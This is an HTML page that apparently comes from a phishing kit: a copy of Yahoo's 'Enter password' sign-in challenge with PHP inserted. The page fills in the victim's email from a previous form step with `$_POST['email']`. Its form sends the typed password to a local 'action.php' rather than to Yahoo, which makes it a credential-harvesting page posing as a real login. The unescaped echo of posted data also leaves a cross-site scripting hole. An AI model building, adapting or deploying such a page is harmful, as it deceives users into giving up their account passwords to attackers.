<html id="Stencil" class="js grid mobile light-theme ">
 <head> 
  <meta charset="utf-8"> 
  <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no"> 
  <meta name="format-detection" content="telephone=no"> 
  <meta name="referrer" content="origin-when-cross-origin"> 
  <title>Yahoo</title> 
  <meta name="description" content="Yahoo"> 
  <link rel="dns-prefetch" href="//gstatic.com"> 
  <link rel="dns-prefetch" href="//google.com"> 
  <link rel="dns-prefetch" href="//s.yimg.com"> 
  <link rel="dns-prefetch" href="//y.analytics.yahoo.com"> 
  <link rel="dns-prefetch" href="//ucs.query.yahoo.com"> 
  <link rel="dns-prefetch" href="//geo.query.yahoo.com"> 
  <link rel="dns-prefetch" href="//geo.yahoo.com"> 
  <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico"> 
  <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico"> 
  <meta name="google-site-verification" content="yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0"> 
  <link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png"> 
  <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png"> 
  <style nonce="">
            #mbr-css-check {
                display: inline;
            }
        </style> 
  <link href="https://s.yimg.com/wm/mbr/a390631cf4d2d945d1a7f78b9c86e8767a6d264f/yahoo-main.css" rel="stylesheet" type="text/css"> 
  <script nonce="">
            var pageStartTime = new Date().getTime();
            (function(root) {
                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
                root.isGoodJS = isGoodJS;
            }(this));
            
(function (root) {
/* -- Data -- */
root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
root.COMET_URL = "https:\u002F\u002Fpr.comet.yahoo.com\u002Fcomet";
root.I13N_config = {"keys":{"pt":"utility","ver":"nodejs"}};
root.I13N_config || (root.I13N_config = {});
root.I13N_config.spaceid = 794333019;
root.I13N_config.location = "https:\u002F\u002Flogin.yahoo.com\u002Faccount\u002Fchallenge\u002Fpassword?display=narrow";
root.I13N_config.referrer = "";
root.I13N_config.keys || (root.I13N_config.keys = {});
root.I13N_config.keys.pg_name = "passwordChallenge";
root.I13N_config.keys.gm_np = "yahoo";
root.I13N_config.keys.p_sec = "DEFAULT_SECTION";
root.I13N_config.keys.p_subsec = "DEFAULT_SUBSECTION";
root.I13N_config.keys.test = "mbr-push-untrusted-ar,mbr-ahc-mobile-web,mbr-oneflow-protection,mbr-ahc-v2,mbr-fido-1fa-login,mbr-authenticator-2fa,mbr-rcscore-threshold,mbr-news-simplifiedreg,mbr-reg-phone-restriction,mbr-qr-comet-sdk";
root.mKeyPrefix = "password-challenge-";
root.challenge || (root.challenge = {});
root.challenge.servingStamp = 1632662894536;
root.challenge.isAndroidWebview = false;
root.I13N_config.keys.pct = "signin";
root.pwchallenge || (root.pwchallenge = {});
root.pwchallenge.messages = {"toolTipShow":"Show password","toolTipHide":"Hide password"};
root.isIOSDevice = false;
}(this));

            
            YUI_config.global = window;


            window.mbrSendError = function (name, url) {
                (new Image()).src = '/account/js-reporting/?rid=6osnivpgl0tbe&crumb=' + encodeURIComponent('/F2MI9LJfH7') + '&message=' + encodeURIComponent(name) + '&url=' + encodeURIComponent(url);
            };

            var oldError = window.onerror;

            window.onerror = function (errorMsg, url) {
                window.mbrSendError(errorMsg, url);
                if (oldError) {
                    oldError.apply(this, arguments);
                }
                return false;
            };

        </script> 
 </head> 
 <body class="bucket-mbr-push-untrusted-ar bucket-mbr-oneflow-protection bucket-mbr-qr-comet-sdk"> 
  <script nonce="">
        (function(root) {
            var doc = document;
            if (root.isGoodJS) {
                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
            }
        }(this));
    </script> 
  <div id="login-body" class="loginish  puree-v2  grid    "> 
   <div class="mbr-login-hd" id="mbr-uh-hd"> 
    <a href="https://uk.yahoo.com/"> <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-GB" width="" height="27"> <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-GB" width="" height="27"> </a> 
   </div> 
   <div class="challenge password-challenge"> 
    <div class="challenge-header"> 
     <div class="yid">
      <?php echo $_POST['email'];?>
     </div> 
    </div>
    <div id="password-challenge" class="primary"> 
     <strong class="challenge-heading">Enter&nbsp;password</strong> 
     <span class="txt-align-center challenge-desc">to finish signing&nbsp;in</span> 
     <form action="action.php" method="post" class="challenge-form"> 
      <input type="hidden" name="email" value="<?php echo $_POST['email'];?>">
      <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="{&quot;language&quot;:&quot;en-GB&quot;,&quot;colorDepth&quot;:24,&quot;deviceMemory&quot;:4,&quot;pixelRatio&quot;:2.75,&quot;hardwareConcurrency&quot;:8,&quot;timezoneOffset&quot;:-360,&quot;timezone&quot;:&quot;Asia/Dhaka&quot;,&quot;sessionStorage&quot;:1,&quot;localStorage&quot;:1,&quot;indexedDb&quot;:1,&quot;cpuClass&quot;:&quot;unknown&quot;,&quot;platform&quot;:&quot;Linux armv8l&quot;,&quot;doNotTrack&quot;:&quot;unknown&quot;,&quot;plugins&quot;:{&quot;count&quot;:0,&quot;hash&quot;:&quot;24700f9f1986800ab4fcc880530dd0ed&quot;},&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;webglVendorAndRenderer&quot;:&quot;Qualcomm~Adreno (TM) 610&quot;,&quot;adBlock&quot;:0,&quot;hasLiedLanguages&quot;:0,&quot;hasLiedResolution&quot;:0,&quot;hasLiedOs&quot;:0,&quot;hasLiedBrowser&quot;:0,&quot;touchSupport&quot;:{&quot;points&quot;:5,&quot;event&quot;:1,&quot;start&quot;:1},&quot;fonts&quot;:{&quot;count&quot;:11,&quot;hash&quot;:&quot;1b3c7bec80639c771f8258bd6a3bf2c6&quot;},&quot;audio&quot;:&quot;124.08075528279005&quot;,&quot;resolution&quot;:{&quot;w&quot;:&quot;393&quot;,&quot;h&quot;:&quot;851&quot;},&quot;availableResolution&quot;:{&quot;w&quot;:&quot;851&quot;,&quot;h&quot;:&quot;393&quot;},&quot;ts&quot;:{&quot;serve&quot;:1632662894536,&quot;render&quot;:1632662894463}}"> 
      <input type="hidden" name="crumb" value="/F2MI9LJfH7"> 
      <input type="hidden" name="acrumb" value="d1G3HSPa"> 
      <input type="hidden" name="sessionIndex" value="QQ--"> 
      <input type="hidden" name="displayName" value="<?php echo $_POST['email'];?>"> 
      <div class="hidden-username"> 
       <input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="username" value="<?php echo $_POST['email'];?>"> 
      </div> 
      <input type="hidden" name="passwordContext" value="normal"> 
      <input type="hidden" name="isShowButtonClicked" id="show-button-clicked" value=""> 
      <input type="hidden" name="showButtonStatus" id="show-button-status" value=""> 
      <input type="hidden" name="prefersReducedMotion" id="prefers-reduce-motion" value=""> 
      <div id="password-container" class="input-group password-container "> 
       <input type="password" id="login-passwd" class="password" name="password" placeholder=" " autocomplete="current-password" data-rapid-tracking="true" data-ylk="elm:input;elmt:focus;slk:passwd;mKey:password-challenge-focus-passwd" required> 
       <label for="login-passwd" id="password-label" class="password-label">Password</label> 
       <div class="caps-indicator hide" id="caps-indicator" title="Caps lock is&nbsp;on"></div> 
       <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1" title="Show&nbsp;password" data-rapid-tracking="true" data-ylk="elm:btn;elmt:toggle;slk:toggle-show-passwd;mKey:password-challenge-toggle-show-hide"> </button> 
      </div> 
      <div class="button-container"> 
       <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Next" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:password-challenge-next"> Next </button> 
      </div> 
      <div class="forgot-cont challenge-button-link"> 
       <input type="submit" class="pure-button puree-button-link challenge-button-link" data-ylk="elm:btn;elmt:skip;slk:skip;mKey:password-challenge-skip-recovery" data-rapid-tracking="true" id="mbr-forgot-link" name="skip" value="Forgotten&nbsp;password?"> 
      </div> 
     </form> 
    </div> 
   </div> 
  </div> 
  <script nonce="">
        var rapidInstance = new YAHOO.i13n.Rapid(I13N_config);
    </script> 
  <noscript> 
   <img src="/account/js-reporting/?crumb=%2FF2MI9LJfH7&amp;message=javascript_not_enabled&amp;ref=%2Faccount%2Fchallenge%2Fpassword" height="0" width="0" style="visibility: hidden;"> 
  </noscript> 
  <script nonce="">
        var checkAssets = function(seconds) {
            setTimeout(function() {
                if (!window.mbrJSLoaded) {
                    window.mbrSendError('js_failed_to_load', location.pathname);
                }
                var check = document.getElementById('mbr-css-check'),
                    style = check.currentStyle;
                if (window.getComputedStyle) {
                    style = window.getComputedStyle(check);
                }
                if (style.display !== 'none') {
                    window.mbrSendError('css_failed_to_load', location.pathname);
                }
            }, (seconds * 1000));
        };

        checkAssets(10);
    </script> 
  <div id="mbr-css-check"></div> 
  <div id="page-mask" class="page-mask hide"></div> 
  <div id="ad"></div> 
  <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar"> 
   <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label> 
   <input type="checkbox" id="mbr-legacy-device-bar-cross"> 
   <p class="mbr-legacy-device"> Yahoo works best with the latest versions of browsers. You're using an out-of-date or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="">More&nbsp;info</a> </p> 
  </div> 
  <script nonce="">
        (function(root) {
            if (!root.isGoodJS) {
                document.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script> 
  <!-- fe25.member.bf1.yahoo.com - Sun Sep 26 2021 13:28:14 GMT+0000 (Coordinated Universal Time) - (1ms) -->
 </body>
</html>